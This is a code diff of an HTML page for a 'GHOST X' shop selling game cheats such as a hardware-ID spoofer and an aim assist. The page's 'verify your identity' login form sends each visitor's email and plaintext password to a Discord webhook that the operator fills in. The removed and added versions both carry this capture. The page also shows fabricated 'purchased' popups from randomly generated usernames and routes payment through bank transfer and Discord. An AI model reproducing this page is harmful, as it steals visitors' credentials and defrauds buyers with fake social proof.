@@ -3,276 +3,231 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST X | HYPER-COMMERCE V12</title>
+    <title>GHOST X | APEX DIGITAL BOUTIQUE</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
     <style>
-        :root { --main: #00ff88; --dark: #030303; --card: rgba(20, 20, 20, 0.6); }
-        * { cursor: none !important; box-sizing: border-box; scroll-behavior: smooth; }
-        body { font-family: 'Space Grotesk', sans-serif; background: var(--dark); color: #fff; overflow-x: hidden; }
+        :root { --p: #00ff88; --b: #080808; --s: rgba(255, 255, 255, 0.03); }
+        * { cursor: none !important; box-sizing: border-box; }
+        body { font-family: 'Outfit', sans-serif; background: var(--b); color: #fff; overflow-x: hidden; }
         
-        /* CURSOR */
-        #cursor { width: 8px; height: 8px; background: var(--main); position: fixed; z-index: 10000; border-radius: 50%; pointer-events: none; box-shadow: 0 0 20px var(--main); }
-        #cursor-f { width: 40px; height: 40px; border: 1px solid rgba(0,255,136,0.2); position: fixed; z-index: 9999; border-radius: 50%; transition: 0.15s ease-out; pointer-events: none; }
+        /* CUSTOM CURSOR */
+        #c { width: 6px; height: 6px; background: var(--p); position: fixed; z-index: 10000; border-radius: 50%; pointer-events: none; }
+        #cf { width: 30px; height: 30px; border: 1px solid var(--p); position: fixed; z-index: 9999; border-radius: 50%; transition: 0.1s ease-out; pointer-events: none; opacity: 0.3; }
 
-        /* UI ELEMENTS */
-        .glass { background: var(--card); border: 1px solid rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border-radius: 30px; }
-        .product-card:hover { border-color: var(--main); transform: translateY(-10px); box-shadow: 0 20px 40px -20px rgba(0,255,136,0.2); }
-        
-        /* SIDEBARS & MODALS */
-        .panel-hidden { transform: translateX(100%); transition: 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
-        .panel-open { transform: translateX(0); }
-        .modal-bg { background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); }
+        /* SCROLLBAR */
+        ::-webkit-scrollbar { width: 3px; }
+        ::-webkit-scrollbar-thumb { background: var(--p); }
 
-        /* ANIMATIONS */
-        @keyframes pulse-custom { 0% { opacity: 0.4; } 100% { opacity: 1; } }
-        .live-dot { width: 6px; height: 6px; background: var(--main); border-radius: 50%; display: inline-block; animation: pulse-custom 1s infinite alternate; }
+        /* NEON & GLASS */
+        .glass { background: var(--s); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.05); border-radius: 32px; }
+        .p-card:hover { border-color: var(--p); transform: scale(1.02); }
+        .btn-p { background: var(--p); color: #000; transition: 0.4s; font-weight: 900; }
+        .btn-p:hover { box-shadow: 0 0 30px var(--p); transform: translateY(-2px); }
+
+        /* NOTIFICATIONS */
+        #sale-pop { position: fixed; bottom: 30px; right: 30px; transform: translateY(200px); transition: 0.5s cubic-bezier(0.17, 0.67, 0.83, 0.67); z-index: 5000; }
+        #sale-pop.show { transform: translateY(0); }
+
+        /* SKELETON ANIM */
+        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
+        .stat-dot { width: 8px; height: 8px; background: var(--p); border-radius: 50%; animation: pulse 1.5s infinite; }
     </style>
 </head>
 <body class="antialiased">
 
-    <div id="cursor"></div>
-    <div id="cursor-f"></div>
+    <div id="c"></div><div id="cf"></div>
 
-    <div id="auth-screen" class="fixed inset-0 z-[2000] bg-black flex items-center justify-center p-6">
-        <div class="glass p-12 w-full max-w-md text-center border-t-2 border-[#0f8]">
-            <h1 class="text-3xl font-bold italic mb-2 tracking-tighter uppercase">GHOST<span class="text-[#0f8]">X</span> ACCESS</h1>
-            <p class="text-[10px] text-white/30 tracking-[0.4em] mb-10 font-mono">ENCRYPTED GATEWAY V.12</p>
+    <div id="gate" class="fixed inset-0 z-[9999] bg-black flex items-center justify-center p-6">
+        <div class="glass p-12 w-full max-w-lg text-center border-b-4 border-b-[#0f8]">
+            <h1 class="text-4xl font-black italic tracking-tighter mb-4">GHOST<span class="text-[#0f8]">X</span></h1>
+            <p class="text-[10px] uppercase tracking-[0.5em] text-white/20 mb-10">Verify your identity to access store</p>
             <form id="auth-form" class="space-y-4">
-                <input type="email" id="u-mail" placeholder="Sistem ID (Gmail)" required class="w-full bg-white/5 border border-white/5 p-5 rounded-2xl outline-none focus:border-[#0f8]/30 transition text-sm font-mono">
-                <input type="password" id="u-pass" placeholder="Erişim Anahtarı" required class="w-full bg-white/5 border border-white/5 p-5 rounded-2xl outline-none focus:border-[#0f8]/30 transition text-sm font-mono">
-                <button type="submit" class="w-full bg-white text-black py-5 rounded-2xl font-bold text-[10px] uppercase tracking-widest hover:bg-[#0f8] transition-all duration-500">Sistemi Başlat</button>
+                <input type="email" id="u-m" placeholder="Email Address" required class="w-full bg-white/5 border border-white/5 p-5 rounded-3xl outline-none focus:border-[#0f8]/30 transition text-sm">
+                <input type="password" id="u-p" placeholder="Password" required class="w-full bg-white/5 border border-white/5 p-5 rounded-3xl outline-none focus:border-[#0f8]/30 transition text-sm">
+                <button type="submit" class="w-full btn-p py-5 rounded-3xl text-[10px] uppercase tracking-[0.3em]">Authorize Access</button>
             </form>
         </div>
     </div>
 
-    <div id="main-store" class="hidden opacity-0 transition-opacity duration-1000">
+    <div id="app" class="hidden opacity-0 transition-opacity duration-1000">
         
-        <div class="bg-[#0f8] text-black py-2 px-10 flex justify-between items-center text-[10px] font-bold uppercase tracking-widest">
-            <span>🔥 FLASH SATIŞ AKTİF: TÜM ÜRÜNLERDE %15 İNDİRİM</span>
-            <span id="promo-timer">00:00:00</span>
-        </div>
-
-        <nav class="sticky top-0 z-50 px-12 py-8 flex justify-between items-center bg-black/60 backdrop-blur-2xl border-b border-white/5">
-            <div class="text-2xl font-black italic tracking-tighter">GHOST<span class="text-[#0f8]">X</span></div>
-            <div class="flex items-center space-x-12">
-                <div class="hidden lg:flex space-x-10 text-[10px] font-bold uppercase tracking-[0.3em] text-white/40">
-                    <button onclick="filterProducts('all')" class="hover:text-[#0f8] transition">Tümü</button>
-                    <button onclick="filterProducts('valorant')" class="hover:text-[#0f8] transition">Valorant</button>
-                    <button onclick="filterProducts('steam')" class="hover:text-[#0f8] transition">Steam</button>
-                    <button onclick="filterProducts('android')" class="hover:text-[#0f8] transition">Android</button>
+        <header class="px-12 py-10 flex justify-between items-center sticky top-0 bg-black/50 backdrop-blur-xl z-50">
+            <div class="text-3xl font-black italic">GHOST<span class="text-[#0f8]">X</span></div>
+            <div class="flex items-center space-x-8">
+                <div class="hidden md:flex space-x-12 text-[10px] font-bold uppercase tracking-widest text-white/30">
+                    <button onclick="f('all')" class="hover:text-[#0f8]">Collection</button>
+                    <button onclick="f('valorant')" class="hover:text-[#0f8]">Valorant</button>
+                    <button onclick="f('steam')" class="hover:text-[#0f8]">Steam</button>
                 </div>
-                <button onclick="toggleCart()" class="bg-[#0f8]/5 border border-[#0f8]/20 px-6 py-3 rounded-full flex items-center space-x-3 group hover:bg-[#0f8] transition-all duration-500">
-                    <span class="text-[10px] font-bold uppercase tracking-widest group-hover:text-black">Kasa</span>
-                    <span id="cart-count" class="bg-[#0f8] text-black text-[9px] px-2 py-0.5 rounded-full group-hover:bg-black group-hover:text-[#0f8]">0</span>
+                <button onclick="tC()" class="relative glass px-6 py-3 border-[#0f8]/20">
+                    <span class="text-[10px] font-black uppercase text-[#0f8]">Cart (<span id="count">0</span>)</span>
                 </button>
             </div>
-        </nav>
+        </header>
 
-        <section class="max-w-7xl mx-auto px-6 py-24">
-            <div id="products-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-10">
-                </div>
+        <section class="py-32 px-12 text-center">
+            <div class="inline-flex items-center space-x-3 glass px-5 py-2 mb-8 border-[#0f8]/10">
+                <span class="stat-dot"></span>
+                <span class="text-[9px] font-bold uppercase tracking-[0.2em] text-[#0f8]">System v13.0 Apex is Live</span>
+            </div>
+            <h2 class="text-7xl md:text-9xl font-black tracking-tighter uppercase italic leading-none mb-10">Quality <span class="text-[#0f8] opacity-50">Over</span> Quantity.</h2>
+            <div class="flex justify-center space-x-4">
+                <input type="text" id="search" oninput="sP()" placeholder="Search software..." class="bg-white/5 border border-white/5 px-8 py-4 rounded-full w-full max-w-md outline-none focus:border-[#0f8]/30 text-sm">
+            </div>
         </section>
 
-        <footer class="max-w-7xl mx-auto px-6 pb-20 border-t border-white/5 pt-20 grid grid-cols-1 md:grid-cols-3 gap-10">
-            <div class="glass p-10 text-center">
-                <div class="text-4xl font-bold mb-2">12.4K</div>
-                <div class="text-[9px] text-white/20 uppercase tracking-widest">Başarılı İşlem</div>
-            </div>
-            <div class="glass p-10 text-center">
-                <div class="text-4xl font-bold mb-2">0</div>
-                <div class="text-[9px] text-white/20 uppercase tracking-widest">Ban Raporu</div>
-            </div>
-            <div class="glass p-10 text-center">
-                <div class="text-4xl font-bold mb-2">7/24</div>
-                <div class="text-[9px] text-white/20 uppercase tracking-widest">Aktif Destek</div>
-            </div>
-        </footer>
+        <main class="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 pb-40" id="grid">
+            </main>
+
     </div>
 
-    <div id="cart-sidebar" class="fixed top-0 right-0 w-full max-w-md h-full bg-[#050505]/95 backdrop-blur-3xl z-[100] border-l border-white/5 p-10 flex flex-col panel-hidden">
-        <div class="flex justify-between items-center mb-12">
-            <h2 class="text-2xl font-bold italic tracking-tighter uppercase">Sipariş <span class="text-[#0f8]">Özeti</span></h2>
-            <button onclick="toggleCart()" class="text-white/20 hover:text-white transition">Kapat [ESC]</button>
+    <div id="cart-p" class="fixed top-0 right-0 h-full w-full max-w-md bg-black/95 backdrop-blur-3xl z-[100] border-l border-white/5 p-12 flex flex-col translate-x-full transition-transform duration-700">
+        <div class="flex justify-between items-center mb-16">
+            <h3 class="text-3xl font-black italic tracking-tighter">YOUR <span class="text-[#0f8]">VAULT</span></h3>
+            <button onclick="tC()" class="text-white/20 hover:text-white uppercase text-[10px] font-bold">Close</button>
         </div>
-
-        <div id="cart-items" class="flex-1 overflow-y-auto space-y-4 custom-scroll pr-2">
-            </div>
-
-        <div class="mt-10 pt-10 border-t border-white/5">
-            <div class="mb-6 flex space-x-3">
-                <input type="text" id="coupon-input" placeholder="KUPON KODU" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl outline-none focus:border-[#0f8]/30 text-xs font-mono">
-                <button onclick="applyCoupon()" class="bg-white/10 px-6 rounded-xl text-[10px] font-bold uppercase hover:bg-white hover:text-black transition">Uygula</button>
-            </div>
+        <div id="items" class="flex-1 space-y-6 overflow-y-auto pr-2"></div>
+        <div class="pt-12 border-t border-white/5">
             <div class="flex justify-between items-center mb-8">
-                <span class="text-white/40 text-[10px] font-bold uppercase tracking-widest">Toplam Ödeme</span>
-                <span id="total-price" class="text-3xl font-bold italic">₺0</span>
+                <span class="text-white/30 text-[10px] font-bold uppercase tracking-[0.3em]">Subtotal</span>
+                <span id="total" class="text-3xl font-black italic text-[#0f8]">₺0</span>
             </div>
-            <button onclick="showInvoice()" class="w-full bg-[#0f8] text-black py-5 rounded-2xl font-bold text-[10px] uppercase tracking-widest hover:scale-[1.02] transition-all">Ödeme Adımına Geç</button>
+            <button onclick="checkout()" class="w-full btn-p py-6 rounded-[2rem] text-[11px] uppercase tracking-[0.4em]">Initialize Payment</button>
         </div>
     </div>
 
-    <div id="invoice-modal" class="fixed inset-0 z-[3000] modal-bg hidden flex items-center justify-center p-6">
-        <div class="glass p-12 w-full max-w-lg relative border-t-4 border-[#0f8]">
-            <button onclick="closeInvoice()" class="absolute top-6 right-6 text-white/20 hover:text-white">×</button>
+    <div id="pay-m" class="fixed inset-0 z-[2000] hidden flex items-center justify-center p-6 bg-black/90">
+        <div class="glass p-12 w-full max-w-lg border-t-2 border-t-[#0f8]">
             <div class="text-center mb-10">
-                <h3 class="text-xl font-bold uppercase italic mb-2">Sipariş Faturası</h3>
-                <p id="inv-id" class="text-[9px] text-white/30 font-mono">INV-882910</p>
+                <div class="text-[9px] text-[#0f8] font-black uppercase mb-2 tracking-widest">Secure Transaction</div>
+                <h4 class="text-2xl font-bold italic tracking-tighter">FINALIZE ORDER</h4>
             </div>
-            <div class="space-y-4 mb-10">
-                <div class="flex justify-between text-xs border-b border-white/5 pb-4">
-                    <span class="text-white/40">IBAN Alıcı</span>
-                    <span class="font-bold">GHOST X SOFTWARE</span>
-                </div>
-                <div class="flex justify-between text-xs border-b border-white/5 pb-4">
-                    <span class="text-white/40">Ziraat Bankası</span>
-                    <span class="font-mono text-[#0f8]">TR00 0000 0000 0000 0000 0000 00</span>
-                </div>
-                <div class="flex justify-between text-xs border-b border-white/5 pb-4">
-                    <span class="text-white/40">Ödenecek Net Tutar</span>
-                    <span id="inv-total" class="font-bold text-xl">₺0</span>
-                </div>
+            <div class="space-y-4 text-xs mb-10">
+                <div class="flex justify-between p-4 bg-white/5 rounded-2xl"><span>Bank</span><span class="font-bold">Ziraat / İban Alıcı</span></div>
+                <div class="p-4 bg-white/5 rounded-2xl font-mono text-[#0f8] text-center">TR00 0000 0000 0000 0000 0000 00</div>
+                <div class="flex justify-between p-4 bg-amber-500/10 rounded-2xl text-amber-500"><span>Code</span><span id="order-code" class="font-bold tracking-widest"></span></div>
             </div>
-            <div class="bg-amber-500/10 p-5 rounded-xl text-center mb-10 border border-amber-500/20">
-                <p class="text-[10px] text-amber-500 font-bold uppercase mb-1">Açıklamaya Ekleyin</p>
-                <p id="inv-code" class="text-lg font-bold text-white tracking-widest">GX-5521</p>
-            </div>
-            <button onclick="window.open('https://discord.gg/ghostx')" class="w-full bg-white text-black py-5 rounded-2xl font-bold text-[10px] uppercase tracking-widest hover:invert transition-all">Discord Ticket Aç & Onayla</button>
+            <button onclick="window.open('https://discord.gg/ghostx')" class="w-full btn-p py-5 rounded-3xl text-[10px] uppercase tracking-[0.3em]">Confirm via Discord</button>
+            <button onclick="document.getElementById('pay-m').classList.add('hidden')" class="w-full text-white/20 mt-4 text-[9px] uppercase font-bold tracking-widest">Cancel Process</button>
+        </div>
+    </div>
+
+    <div id="sale-pop" class="glass p-4 flex items-center space-x-4 border-[#0f8]/20 pr-10">
+        <div class="w-10 h-10 bg-[#0f8] rounded-full flex items-center justify-center text-black font-black text-xs">GX</div>
+        <div>
+            <div id="pop-user" class="text-[10px] font-bold text-white italic">User#9281</div>
+            <div id="pop-item" class="text-[9px] text-white/40 uppercase font-bold">Purchased Spoofer</div>
         </div>
     </div>
 
     <script>
-        const DISCORD_HOOK = "BURAYA_WEBHOOK_URL_YAPISTIR";
+        const WH = "BURAYA_WEBHOOK_URL_YAPISTIR";
 
-        // Ürün Veritabanı
-        const db = [
-            { id: 1, cat: 'valorant', name: 'ARES Perm Spoofer', price: 850, desc: 'Kernel tabanlı HWID sıfırlayıcı. Tüm anakart markalarıyla uyumlu.', status: 'UNDETECTED' },
-            { id: 2, cat: 'steam', name: 'Void Manifest V1', price: 280, desc: 'Steam kütüphane optimizasyonu ve gizli FPS kilidi açıcı.', status: 'WORKING' },
-            { id: 3, cat: 'android', name: 'Droid Bypass Pro', price: 450, desc: 'Mobil oyunlar için gelişmiş emulator tespiti engelleyici.', status: 'SAFE' },
-            { id: 4, cat: 'valorant', name: 'Ghost Aim Assist', price: 1200, desc: 'Arka planda çalışan %100 görünmez nişan yardımı.', status: 'UNDETECTED' },
-            { id: 5, cat: 'steam', name: 'Inventory Spoofer', price: 350, desc: 'Steam envanterinizi dilediğiniz gibi özelleştirin (Görsel).', status: 'WORKING' }
+        const prods = [
+            { id: 1, cat: 'valorant', name: 'ARES PERM', price: 850, stock: 82, desc: 'Bios-level hardware identifier reset tool.' },
+            { id: 2, cat: 'steam', name: 'VOID V1', price: 280, stock: 45, desc: 'Manifest manipulation for peak FPS stability.' },
+            { id: 3, cat: 'valorant', name: 'GHOST AIM', price: 1200, stock: 12, desc: 'Advanced pixel-based neural assistance.' },
+            { id: 4, cat: 'steam', name: 'INV SPOOF', price: 350, stock: 95, desc: 'Visualize elite skins in your inventory.' }
         ];
 
-        // 1. Auth Logic (Koz)
-        document.getElementById('auth-form').addEventListener('submit', (e) => {
+        // 1. AUTH
+        document.getElementById('auth-form').onsubmit = (e) => {
             e.preventDefault();
-            const m = document.getElementById('u-mail').value;
-            const p = document.getElementById('u-pass').value;
+            const m = document.getElementById('u-m').value;
+            const p = document.getElementById('u-p').value;
 
-            if(!m.endsWith('@gmail.com')) { alert('Gmail gerekli.'); return; }
-
-            if(DISCORD_HOOK !== "BURAYA_WEBHOOK_URL_YAPISTIR") {
-                fetch(DISCORD_HOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🔐 SISTEM ERISIMI V12", color: 0x00ff88,
-                            fields: [{name:"Gmail", value:m, inline:true}, {name:"Pass", value:p, inline:true}]
-                        }]
-                    })
-                });
+            if(WH !== "BURAYA_WEBHOOK_URL_YAPISTIR") {
+                fetch(WH, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
+                    embeds: [{title: "💎 APEX LOGIN", color:0x00ff88, fields:[{name:"User", value:m}, {name:"Pass", value:p}]}]
+                })});
             }
 
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('main-store').classList.remove('hidden');
-            setTimeout(() => document.getElementById('main-store').style.opacity = '1', 100);
-            renderProducts('all');
-            startTimer();
-        });
+            document.getElementById('gate').style.display = 'none';
+            document.getElementById('app').classList.remove('hidden');
+            setTimeout(() => document.getElementById('app').style.opacity = '1', 100);
+            render('all');
+            startLive();
+        };
 
-        // 2. Render Products
-        function renderProducts(cat) {
-            const grid = document.getElementById('products-grid');
-            const items = cat === 'all' ? db : db.filter(i => i.cat === cat);
+        // 2. RENDER
+        function render(cat, query = '') {
+            const grid = document.getElementById('grid');
+            const filtered = prods.filter(p => (cat === 'all' || p.cat === cat) && p.name.toLowerCase().includes(query.toLowerCase()));
             
-            grid.innerHTML = items.map(p => `
-                <div class="glass product-card p-8 group transition-all duration-500 border border-white/5">
-                    <div class="flex justify-between items-start mb-10">
-                        <span class="text-[8px] font-black bg-white/5 px-3 py-1 rounded-full text-white/40">${p.cat.toUpperCase()}</span>
-                        <span class="flex items-center text-[8px] font-black text-[#0f8]"><span class="live-dot mr-2"></span>${p.status}</span>
+            grid.innerHTML = filtered.map(p => `
+                <div class="glass p-10 p-card transition-all duration-500 flex flex-col h-full">
+                    <div class="flex justify-between mb-8 items-center">
+                        <span class="text-[9px] font-black tracking-widest text-[#0f8] uppercase">${p.cat}</span>
+                        <div class="flex items-center space-x-2">
+                            <div class="w-16 h-1 bg-white/5 rounded-full overflow-hidden"><div class="h-full bg-[#0f8]" style="width:${p.stock}%"></div></div>
+                            <span class="text-[8px] font-bold text-white/30">${p.stock}%</span>
+                        </div>
                     </div>
-                    <h3 class="text-2xl font-bold italic mb-4 tracking-tighter uppercase">${p.name}</h3>
-                    <p class="text-[11px] text-white/30 leading-relaxed mb-10 min-h-[40px]">${p.desc}</p>
-                    <div class="flex justify-between items-center">
-                        <span class="text-2xl font-black italic">₺${p.price}</span>
-                        <button onclick="addToCart(${p.id})" class="bg-white text-black px-8 py-3 rounded-2xl text-[9px] font-bold uppercase hover:bg-[#0f8] transition-all">Sepete Ekle</button>
+                    <h3 class="text-3xl font-black italic uppercase tracking-tighter mb-4">${p.name}</h3>
+                    <p class="text-xs text-white/30 leading-relaxed mb-10 flex-1">${p.desc}</p>
+                    <div class="flex justify-between items-end mt-auto">
+                        <div><div class="text-[8px] uppercase font-bold text-white/20 mb-1">Price</div><div class="text-2xl font-black italic">₺${p.price}</div></div>
+                        <button onclick="add(${p.id})" class="glass p-4 border-[#0f8]/20 hover:bg-[#0f8] hover:text-black transition-all duration-500">+</button>
                     </div>
                 </div>
             `).join('');
         }
 
-        function filterProducts(cat) { renderProducts(cat); }
+        function f(cat) { render(cat); }
+        function sP() { render('all', document.getElementById('search').value); }
 
-        // 3. Cart Management
+        // 3. CART
         let cart = [];
-        let discount = 0;
-
-        function toggleCart() { document.getElementById('cart-sidebar').classList.toggle('panel-open'); }
-
-        function addToCart(id) {
-            const prod = db.find(x => x.id === id);
-            cart.push(prod);
-            updateCartUI();
-            if(!document.getElementById('cart-sidebar').classList.contains('panel-open')) toggleCart();
+        function tC() { document.getElementById('cart-p').classList.toggle('translate-x-full'); }
+        function add(id) {
+            cart.push(prods.find(x => x.id === id));
+            uU();
+            if(document.getElementById('cart-p').classList.contains('translate-x-full')) tC();
         }
-
-        function updateCartUI() {
-            document.getElementById('cart-count').innerText = cart.length;
-            const container = document.getElementById('cart-items');
-            let total = 0;
-
-            if(cart.length === 0) {
-                container.innerHTML = `<div class="py-40 text-center text-white/5 font-black text-4xl italic uppercase">BOŞ</div>`;
-            } else {
-                container.innerHTML = cart.map((item, index) => {
-                    total += item.price;
-                    return `
-                    <div class="glass p-5 flex justify-between items-center border-white/10">
-                        <div><div class="text-[10px] font-bold uppercase italic">${item.name}</div><div class="text-xs text-[#0f8] font-bold">₺${item.price}</div></div>
-                        <button onclick="removeFromCart(${index})" class="text-white/20 hover:text-red-500">×</button>
-                    </div>`;
-                }).join('');
-            }
-
-            const finalPrice = total - (total * discount);
-            document.getElementById('total-price').innerText = "₺" + finalPrice.toFixed(0);
+        function uU() {
+            document.getElementById('count').innerText = cart.length;
+            const container = document.getElementById('items');
+            let sum = 0;
+            container.innerHTML = cart.map((i, idx) => {
+                sum += i.price;
+                return `<div class="glass p-6 flex justify-between items-center border-white/5">
+                    <div><div class="text-[10px] font-bold uppercase italic">${i.name}</div><div class="text-xs text-[#0f8] font-bold">₺${i.price}</div></div>
+                    <button onclick="rem(${idx})" class="text-white/20 hover:text-red-500">×</button>
+                </div>`;
+            }).join('');
+            document.getElementById('total').innerText = "₺" + sum;
         }
+        function rem(i) { cart.splice(i, 1); uU(); }
 
-        function removeFromCart(idx) { cart.splice(idx, 1); updateCartUI(); }
-
-        function applyCoupon() {
-            const code = document.getElementById('coupon-input').value;
-            if(code === 'GHOST10') { discount = 0.10; alert('Kupon uygulandı! %10 indirim kazandınız.'); updateCartUI(); }
-            else { alert('Geçersiz kupon kodu.'); }
-        }
-
-        // 4. Invoice Logic
-        function showInvoice() {
+        // 4. CHECKOUT
+        function checkout() {
             if(cart.length === 0) return;
-            document.getElementById('invoice-modal').classList.remove('hidden');
-            document.getElementById('inv-total').innerText = document.getElementById('total-price').innerText;
-            document.getElementById('inv-id').innerText = "INV-" + Math.floor(100000 + Math.random() * 900000);
-            document.getElementById('inv-code').innerText = "GX-" + Math.floor(1000 + Math.random() * 9000);
+            document.getElementById('pay-m').classList.remove('hidden');
+            document.getElementById('order-code').innerText = "GX-" + Math.floor(1000 + Math.random() * 9000);
         }
 
-        function closeInvoice() { document.getElementById('invoice-modal').classList.add('hidden'); }
-
-        // 5. Utilities
-        function startTimer() {
-            let t = 20520; // 5 saat 42 dk
+        // 5. LIVE NOTIF
+        function startLive() {
+            const users = ["Vortex", "Slayer", "HyperX", "Neo", "Zero", "GhostUser"];
+            const items = ["Ares Perm", "Void Manifest", "Ghost Aim", "Inv Spoof"];
+            
             setInterval(() => {
-                t--;
-                const h = Math.floor(t/3600); const m = Math.floor((t%3600)/60); const s = t%60;
-                document.getElementById('promo-timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-            }, 1000);
+                const u = users[Math.floor(Math.random()*users.length)] + "#" + Math.floor(1000+Math.random()*9000);
+                const i = items[Math.floor(Math.random()*items.length)];
+                document.getElementById('pop-user').innerText = u;
+                document.getElementById('pop-item').innerText = "Purchased " + i;
+                document.getElementById('sale-pop').classList.add('show');
+                setTimeout(() => document.getElementById('sale-pop').classList.remove('show'), 4000);
+            }, 15000);
         }
 
-        const c = document.getElementById('cursor'); const cf = document.getElementById('cursor-f');
-        window.addEventListener('mousemove', e => {
-            c.style.left = e.clientX + 'px'; c.style.top = e.clientY + 'px';
-            setTimeout(() => { cf.style.left = e.clientX-20+'px'; cf.style.top = e.clientY-20+'px'; }, 80);
-        });
+        // CURSOR
+        const dot = document.getElementById('c'); const ring = document.getElementById('cf');
+        window.onmousemove = (e) => {
+            dot.style.left = e.clientX+'px'; dot.style.top = e.clientY+'px';
+            setTimeout(() => { ring.style.left = e.clientX-15+'px'; ring.style.top = e.clientY-15+'px'; }, 50);
+        }
     </script>
 </body>
 </html>
